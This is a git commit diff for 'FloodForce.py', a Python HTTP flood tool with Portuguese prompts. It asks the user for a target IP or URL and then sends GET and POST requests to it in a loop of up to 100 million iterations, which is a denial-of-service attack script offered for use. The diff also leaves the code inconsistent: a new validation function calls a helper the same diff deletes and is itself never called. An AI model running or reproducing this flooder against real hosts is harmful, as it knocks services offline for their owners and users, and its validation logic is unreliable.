4039bda2f53b68638cffb5cec67cf845d4d1829c
DarkZero <ruanvsd2024@gmail.com>
2025-09-30 13:38:19 -0300

    Update FloodForce.py

--- FloodForce.py
+++ FloodForce.py
@@ -1,7 +1,8 @@
 import requests
 import os
 import pyfiglet
-from colorama import init, Fore, Style
+from colorama import init, Fore, Style, Back
+
 import sys
 import time
 from urllib.parse import urlparse
@@ -9,49 +10,62 @@ from urllib.parse import urlparse
 class httpFlood:
     def atack(self):
         os.system("cls" if sys.platform == "win32" else "clear")
+        
         try:
             def logo():
-                lg = pyfiglet.figlet_format("FloodForce")
-                print(Fore.YELLOW + f"{lg}" + Style.RESET_ALL)
+                try:
+                	lg = pyfiglet.figlet_format("FloodForce")
+                	print(Fore.YELLOW + f"{lg}"+ Style.RESET_ALL)
+                	print(Fore.RED+"Press CTRL'C  OU 'sair' PARA SAIR\n")
+                	
+                	print(Fore.BLUE+"Author :",Fore.WHITE+"DarkZer0")
+                	print(Fore.BLUE+"Github :",Fore.WHITE+"https://github.com/DarkZer0")
+                	print(Fore.BLUE+"Source :",Fore.WHITE+"https://github.com/DarkZer0/FloodForce\n")
+                	
+                except ModuleNotFoundError:
+                	print("VOCÊ NÃO TEM O COLORAMA INSTALADO")
+                	
             logo()
 
             try:
-                url = input(Fore.CYAN + "Digite o ip/url (http ou https://url.com): ")
+                host = input(Fore.CYAN + "Digite o ip ou url (com http:// ou https://): ")
+                print("\n")
                 
-                if not url:
-                    print(Fore.YELLOW + "url em branco!!")
+                if not host:
+                    print(Fore.YELLOW + "url ou ip em branco!!")
                     time.sleep(1)
                     exit()
-                elif url == "sair":
+                    
+                elif host == "sair":
                     print(Fore.RED + "você saiu!")
                     time.sleep(1)
                     exit()
+                    
             except Exception as e:
                 print(Fore.RED + "ERROR")
 
-            def validar_url(url):
+            def validar_site(host):
                 try:
-                    resultado = urlparse(url)
-                    return all([resultado.scheme, resultado.netloc])
-                    
+                	test = requests.get(host)
+                	if test.status_code == 200:
+                		
+                		if validar_url(host):
+                			print(Fore.GREEN + "url ou ip validos\n")
+                		
+                		else:
+                			print(Fore.YELLOW + "url ou ip invalidos\n")
+                			time.sleep(1)
+                			exit()
+                			
                 except ValueError:
                     print(Fore.RED + "ERRO DE VALOR")
                     exit()
-                    
-            test_get = requests.get(url)    
-            if test_get.status_code == 200:
-                if validar_url(url):
-                	print(Fore.GREEN + "url valida\n")
-                	
-            else:
-                 	print(Fore.YELLOW + "url invalida")
-                 	time.sleep(1)
-                 	exit()
 
-            for i in range(1, 100000000000):
-                get = requests.get(url)
-                post = requests.post(url)
-                print(Fore.GREEN + f"status do flood:", get.status_code, f"{i}" + Style.RESET_ALL)
+            for i in range(1, 100000000):
+                get = requests.get(host)
+                post = requests.post(host)
+                
+                print(Fore.GREEN + f"status do flood:", get.status_code, f"/ quantidade: {i}" + Style.RESET_ALL)
                 	
         except KeyboardInterrupt:
             print(Fore.RED + "saindo..." + Style.RESET_ALL)
